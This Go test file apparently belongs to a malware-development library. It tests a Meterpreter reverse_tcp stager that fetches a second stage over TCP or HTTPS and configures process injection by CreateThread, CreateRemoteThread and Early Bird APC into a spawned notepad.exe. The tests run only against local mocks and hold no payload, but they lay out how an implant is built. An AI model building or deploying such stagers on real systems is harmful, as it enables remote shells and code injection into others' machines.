package meterpreter

import (
	"context"
	"encoding/binary"
	"net"
	"strconv"
	"testing"
	"time"

	"github.com/oioio-space/maldev/inject"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestFetchStageTCPMock starts a local TCP listener that emits a 4-byte
// little-endian size prefix followed by a known payload, then verifies that
// fetchStageTCP returns exactly that payload.
func TestFetchStageTCPMock(t *testing.T) {
	payload := []byte{0xAA, 0xBB, 0xCC, 0xDD}

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	require.NoError(t, err, "failed to bind test listener")
	defer ln.Close()

	// Serve one connection: send size header + payload, then close.
	done := make(chan struct{})
	go func() {
		defer close(done)
		conn, acceptErr := ln.Accept()
		if acceptErr != nil {
			return
		}
		defer conn.Close()

		var sizeBuf [4]byte
		binary.LittleEndian.PutUint32(sizeBuf[:], uint32(len(payload)))
		conn.Write(sizeBuf[:]) //nolint:errcheck
		conn.Write(payload)    //nolint:errcheck
	}()

	addr := ln.Addr().(*net.TCPAddr)
	cfg := &Config{
		Transport: TransportTCP,
		Host:      "127.0.0.1",
		Port:      strconv.Itoa(addr.Port),
		Timeout:   5 * time.Second,
	}

	stager := NewStager(cfg)
	require.NotNil(t, stager)

	stager.ctx = context.Background()

	stage, err := stager.fetchStageTCP()
	require.NoError(t, err, "fetchStageTCP must succeed")
	assert.Equal(t, payload, stage, "received stage must match the payload sent by the mock server")

	// Wait for the goroutine to finish cleanly.
	select {
	case <-done:
	case <-time.After(3 * time.Second):
		t.Error("server goroutine did not finish in time")
	}
}

func TestPayloadName(t *testing.T) {
	name := PayloadName(TransportTCP)

	assert.Contains(t, name, "meterpreter", "payload name must contain 'meterpreter'")
	assert.Contains(t, name, "reverse_tcp", "payload name must contain 'reverse_tcp'")
}

func TestNewStager(t *testing.T) {
	cfg := &Config{
		Transport: TransportTCP,
		Host:      "127.0.0.1",
		Port:      "4444",
		Timeout:   5 * time.Second,
	}

	s := NewStager(cfg)
	require.NotNil(t, s, "NewStager must return a non-nil Stager")
}

func TestNewStagerWithInjectionConfig(t *testing.T) {
	cfg := &Config{
		Transport:   TransportTCP,
		Host:        "127.0.0.1",
		Port:        "4444",
		Timeout:     5 * time.Second,
		Method:      inject.MethodCreateThread,
		TargetPID:   0,
		ProcessPath: "",
		Fallback:    true,
	}

	s := NewStager(cfg)
	require.NotNil(t, s)
	assert.Equal(t, inject.MethodCreateThread, s.config.Method)
	assert.True(t, s.config.Fallback)
	assert.Equal(t, 0, s.config.TargetPID)
}

func TestNewStagerWithRemoteInjection(t *testing.T) {
	cfg := &Config{
		Transport: TransportTCP,
		Host:      "127.0.0.1",
		Port:      "4444",
		Timeout:   5 * time.Second,
		Method:    inject.MethodCreateRemoteThread,
		TargetPID: 1234,
		Fallback:  true,
	}

	s := NewStager(cfg)
	require.NotNil(t, s)
	assert.Equal(t, inject.MethodCreateRemoteThread, s.config.Method)
	assert.Equal(t, 1234, s.config.TargetPID)
}

func TestNewStagerWithSpawnAndInject(t *testing.T) {
	cfg := &Config{
		Transport:   TransportHTTPS,
		Host:        "10.0.0.1",
		Port:        "8443",
		Timeout:     30 * time.Second,
		TLSInsecure: true,
		Method:      inject.MethodEarlyBirdAPC,
		ProcessPath: `C:\Windows\System32\notepad.exe`,
		Fallback:    true,
	}

	s := NewStager(cfg)
	require.NotNil(t, s)
	assert.Equal(t, inject.MethodEarlyBirdAPC, s.config.Method)
	assert.Equal(t, `C:\Windows\System32\notepad.exe`, s.config.ProcessPath)
}

func TestDefaultMethodForStage(t *testing.T) {
	m := inject.DefaultMethodForStage()
	assert.NotEmpty(t, m, "DefaultMethodForStage must return a non-empty method")
}

func TestConfigMethodEmpty_UsesDefaultPath(t *testing.T) {
	// When Method is empty, the stager should use the default
	// executeInMemory path (no inject package routing).
	cfg := &Config{
		Transport: TransportTCP,
		Host:      "127.0.0.1",
		Port:      "4444",
		Timeout:   5 * time.Second,
	}

	s := NewStager(cfg)
	assert.Empty(t, s.config.Method, "empty Method means default self-injection path")
}
